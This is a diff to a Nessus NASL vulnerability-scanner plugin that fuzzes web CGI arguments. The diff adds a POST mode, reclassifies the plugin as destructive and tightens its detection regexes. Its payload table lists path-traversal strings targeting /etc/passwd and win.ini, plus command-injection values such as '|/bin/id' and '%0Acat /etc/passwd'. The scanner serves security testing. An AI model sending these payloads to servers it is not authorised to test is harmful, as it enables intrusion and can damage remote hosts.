@@ -18,7 +18,9 @@
 if(description)
 {
  script_id(10672);
- script_version ("$Revision: 1.32 $");
+ script_version ("$Revision: 1.44 $");
+# script_cve_id("CVE-MAP-NOMATCH");
+ script_xref(name: "OWASP", value: "OWASP-AC-001");
  
  name["english"] = "Unknown CGIs arguments torture";
  name["francais"] = "Unknown CGIs arguments torture";
@@ -32,7 +34,7 @@ arguments (../../etc/passwd et al.).
 *** IN NO WAY THIS SCRIPT IS AS GOOD AS A HUMAN BEING TO
 *** DO THIS KIND OF JOB
 
-Risk factor : From None to High";
+Risk factor : None to High";
 
 
 
@@ -43,7 +45,7 @@ Risk factor : From None to High";
  
  script_summary(english:summary["english"]);
  
- script_category(ACT_GATHER_INFO);
+ script_category(ACT_DESTRUCTIVE_ATTACK); # Will mess the remote server
  
  
  script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
@@ -54,6 +56,11 @@ Risk factor : From None to High";
  script_dependencie("find_service.nes", "httpver.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);
  script_timeout(360); 
+ 
+ script_add_preference(name:"Send POST requests",
+                       type:"checkbox", value:"no");
+
+ script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
 }
 
@@ -64,6 +71,11 @@ include("http_keepalive.inc");
 
 success = "";
 pricereport = "";
+
+
+do_post = script_get_preference("Send POST requests");
+if ( do_post && "yes" >< do_post ) do_post = 1;
+else do_post = 0;
 
 function test(req, pattern)
 {
@@ -83,10 +95,33 @@ function test(req, pattern)
 }
 
 
+function test_post(req, pattern)
+{
+ local_var str, r, variables;
+# display(req, "\n");
+
+ variables = ereg_replace(pattern:"^([^\?])\?(.*)", replace:"\2", string:req);
+ req = ereg_replace(pattern:"^([^\?])\?(.*)", replace:"\1", string:req);
+ 
+ str = string("POST ", req, " HTTP/1.1\r\n", 
+              "Host: ", get_host_name(), ":", port, "\r\n", 
+              "Content-Type: application/x-www-form-urlencoded\r\n", 
+              "Content-Length: ", strlen(variables), "\r\n\r\n", variables);
+
+ r = http_keepalive_send_recv(port:port, data:str);
+# display(r);
+ if ( r == NULL ) exit(0);
+ if(egrep(pattern:pattern, string:r))
+        {
+  	success = success + string("\n") + req;
+ 	r = 0;
+ 	}
+ return(0);
+}
 
 
-port = get_kb_item("Services/www");
-if(!port)port = 80;
+port = get_http_port(default:80);
+
 if(!get_port_state(port))exit(0);
 
 
@@ -97,16 +132,16 @@ if(!get_port_state(port))exit(0);
 #------------------------------#
 # Remote file listing (20pts)  #
 #------------------------------#
-flaws[0]="/etc/passwd";					pat[0]="root:";
-flaws[1]="../../../../../../../../etc/passwd";			pat[1]="root:";
-flaws[2]="../../../../../../../../etc/passwd%00";		pat[2]="root:";
-flaws[3]="../../../../../../../../etc/passwd%00.html";		pat[3]="root:";
-flaws[4]="../../../../../../../../etc/passwd%00index.html"; 	pat[4]="root:";
+flaws[0]="/etc/passwd";					pat[0]="root:.*:0:[01]:";
+flaws[1]="../../../../../../../../etc/passwd";			pat[1]=pat[0];
+flaws[2]="../../../../../../../../etc/passwd%00";		pat[2]=pat[0];
+flaws[3]="../../../../../../../../etc/passwd%00.html";		pat[3]=pat[0];
+flaws[4]="../../../../../../../../etc/passwd%00index.html"; 	pat[4]=pat[0];
 flaws[5]="%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd";
-								pat[5]="root:";
+								pat[5]=pat[0];
  # (this one is ../../../etc/passwd uuencoded - at least one cgi was vulnerable to this)		
-flaws[6]="Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAo=";		pat[6]="root:";
-flaws[7]="%60/etc/passwd%60";					pat[7]="root:";
+flaws[6]="Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAo=";		pat[6]=pat[0];
+flaws[7]="%60/etc/passwd%60";					pat[7]=pat[0];
 
 flaws[8]=string("..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini");	pat[8]="\[windows\]";
 flaws[9]=string("..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini");	pat[9]="\[fonts\]";
@@ -133,16 +168,16 @@ flaws[19]=string("..\\..\\..\\..\\..\\..\\..\\winnt");		pat[19]="win\.ini";
 #------------------------------#
 # Arbitrary commands (100 pts) #
 #------------------------------#
-flaws[20]="%0Acat%20/etc/passwd";				pat[20]="root:";
-flaws[21]="|cat%20/etc/passwd|";				pat[21]="root:";
-flaws[22]="x%0Acat%20/etc/passwd";				pat[22]="root:";
-flaws[23]="%3Bid";						pat[23]="uid=";
-flaws[24]="|/bin/id";						pat[24]="uid=";
-flaws[25]="|/usr/bin/id";					pat[25]="uid=";
-flaws[26]="|id|";						pat[26]="uid=";
-flaws[27]="VALUE;/bin/id";					pat[27]="uid=";
-flaws[28]="VALUE;/usr/bin/id";					pat[28]="uid=";
-flaws[29]="VALUE%0Acat%20/etc/passwd";				pat[29]="uid=";
+flaws[20]="%0Acat%20/etc/passwd";				pat[20]=pat[0];
+flaws[21]="|cat%20/etc/passwd|";				pat[21]=pat[0];
+flaws[22]="x%0Acat%20/etc/passwd";				pat[22]=pat[0];
+flaws[23]="%3Bid";						pat[23]="uid=[0-9]";
+flaws[24]="|/bin/id";						pat[24]=pat[23];
+flaws[25]="|/usr/bin/id";					pat[25]=pat[23];
+flaws[26]="|id|";						pat[26]=pat[23];
+flaws[27]="VALUE;/bin/id";					pat[27]=pat[23];
+flaws[28]="VALUE;/usr/bin/id";					pat[28]=pat[23];
+flaws[29]="VALUE%0Acat%20/etc/passwd";				pat[29]=pat[23];
 flaws[30]="VALUE%20|%20dir";					pat[30]="<DIR>";
 
 
@@ -167,6 +202,9 @@ flaws[34]="http://xxxxxxxxxxxx/";				pat[34]="http://xxxxxxxxxxxx//?[a-z,A-Z,0-9
 
 cgis = get_kb_list(string("www/", port, "/cgis"));
 if(isnull(cgis))exit(0);
+
+# As get_kb_list may return an array with duplicated keys, we call
+# make_list() to clean it, just in case.
 cgis = make_list(cgis);
 
 foreach cgi (cgis)
@@ -258,6 +296,7 @@ pricereport,
 		     replace:vals[i]);
    req = string(string(cgi_name), "?", req, string(args[i]), "=") + fl;
    test(req:req, pattern:pat[j]);
+   if ( do_post ) test_post(req:req, pattern:pat[j]);
   }
  }
  }
@@ -269,6 +308,7 @@ pricereport,
 		     replace:"nessus");
    req = string(cgi_name, "?") + fl;
    test(req:req,pattern:pat[j]);
+   if ( do_post ) test_post(req:req,pattern:pat[j]);
    }
  }
 }
